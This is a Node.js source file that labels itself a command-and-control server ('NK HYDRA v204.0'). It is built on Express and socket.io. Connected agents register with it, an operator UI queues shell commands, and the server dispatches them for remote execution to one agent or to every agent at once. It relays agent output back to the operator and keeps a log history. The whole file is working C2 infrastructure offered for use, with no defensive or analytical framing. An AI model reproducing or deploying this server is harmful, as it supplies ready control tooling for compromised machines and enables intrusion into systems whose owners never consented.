// TYPE: NODE.JS C2 SERVER
// NK HYDRA v204.0 [HISTORY BUFFER & LOG SYNC]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/health', (req, res) => { res.status(200).send('OK'); });
app.get('/', (req, res) => { 
    res.json({ status: 'online', version: 'v204.0', agents: agents.length }); 
});

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 5000, 
    pingTimeout: 10000, // Short timeout to detect disconnects fast
    maxHttpBufferSize: 1e8, 
    transports: ['polling', 'websocket'] 
});

let agents = []; 
const commandQueue = [];
const eventHistory = []; // CIRCULAR BUFFER FOR LOGS
const MAX_HISTORY = 100;

// Log helper that broadcasts AND saves to history
const broadcastLog = (type, payload) => {
    const event = { type, payload, timestamp: Date.now() };
    
    // Save to history
    eventHistory.push(event);
    if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
    
    // Broadcast to UI Room
    io.to('ui_room').emit('agent_event', event);
};

// Queue Processor
let isProcessingQueue = false;
const processQueue = async () => {
    if (isProcessingQueue || commandQueue.length === 0) return;
    isProcessingQueue = true;

    while (commandQueue.length > 0) {
        const task = commandQueue.shift();
        if (task) {
            try {
                if (task.targetId === 'all') {
                    io.emit('exec_cmd', { cmd: task.cmd, id: task.id });
                    broadcastLog('INFO', { source: 'C2', message: 'Broadcast Sent', cmd: task.cmd });
                } else {
                    const agent = agents.find(a => a.id === task.targetId);
                    if (agent && agent.socketId) {
                         io.to(agent.socketId).emit('exec_cmd', { cmd: task.cmd, id: task.id });
                         broadcastLog('INFO', { source: 'C2', message: `Dispatched to ${agent.id}`, cmd: task.cmd });
                    } else {
                        broadcastLog('WARNING', { source: 'C2', message: 'Agent Offline for Task', target: task.targetId });
                    }
                }
            } catch (e) {
                console.error(e);
            }
        }
        await new Promise(r => setTimeout(r, 100)); 
    }
    isProcessingQueue = false;
};

io.on('connection', (socket) => {
    
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            
            // SEND STATE DUMP
            socket.emit('agents_list', agents);
            socket.emit('history_dump', eventHistory); // CRITICAL: Send past logs
            
            broadcastLog('SUCCESS', { source: 'C2_SYS', message: 'UI Admin Connected' });
            return;
        }
        
        // Agent Logic
        agents = agents.filter(a => a.id !== data.id);
        agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() });
        
        io.to('ui_room').emit('agents_list', agents);
        broadcastLog('SUCCESS', { source: 'C2_SYS', message: `Agent Reconnected: ${data.id}` });
        
        if(commandQueue.length > 0) processQueue();
    });

    socket.on('exec_cmd', (data) => {
        commandQueue.push({ ...data, id: Date.now().toString() });
        processQueue();
    });
    
    // RELAY AGENT EVENTS TO UI
    socket.on('agent_event', (data) => {
        // Data should have { type, payload, agentId }
        // We wrap it to ensure it goes to history properly
        const event = { 
            type: data.type, 
            agentId: data.agentId || 'UNKNOWN',
            payload: data.payload,
            timestamp: Date.now()
        };
        
        eventHistory.push(event);
        if (eventHistory.length > MAX_HISTORY) eventHistory.shift();
        
        io.to('ui_room').emit('agent_event', event);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
            broadcastLog('WARNING', { source: 'C2_SYS', message: `Agent Dropped: ${agent.id}` });
        }
    });
    
    socket.on('heartbeat', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) agent.lastSeen = Date.now();
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v204 LISTENING ON ${PORT}`));
